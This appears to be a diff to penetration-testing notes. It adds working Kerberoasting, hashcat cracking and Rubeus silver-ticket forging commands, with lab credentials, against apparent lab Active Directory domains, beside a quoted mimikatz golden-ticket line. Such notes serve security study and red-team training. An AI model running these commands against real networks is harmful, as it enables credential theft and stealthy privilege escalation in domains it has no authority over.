@@ -90,6 +90,22 @@ kerberos::golden /User:Administrator /domain:marvel.local /sid:S-1-5-21-36140207
 
 #### Silver ticket attack :
 With golden ticket attack, we used the hash of a krbtgt account whereas in the case of the silver ticket attack we will use the password hash of a service account. The password hash of the service account can be extracted by various methods, Kerberoasting being one. Since no intermediary TGT is required for the silver ticket attack to work, silver tickets can be forged without any communication with a Domain Controller and hence is stealthier than golden ticket attack.
+
 ```bash
+#requirements 
+Service hash <perform kerberoasting>
+Service name <get from kerberoasting attack>
+Target FQDN 
+Domain SID  <whoami /user>
+
+
+rubeus.exe kerberoast /domain:ignite.local /creduser:ignite.localaarti /credpassword:Password@1 /nowrap
+
+hashcat -m 13100 '$krb5tgs$23$*sqluser$ignite.local$MSSQLSvc/dc1.ignite.local:1433@ignite.local*$..<snipped>...4297093077601CC' /usr/share/wordlists/rockyou.txt --force
+rubeus.exe hash /password:Password@1
+
+
+rubeus.exe silver /service:MSSQLSvc/dc1.ignite.local /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /sid:S-1-5-21-2377760704-1974907900-3052042330 /user:harshitrajpal /domain:ignite.local /ptt
+
 
 ```
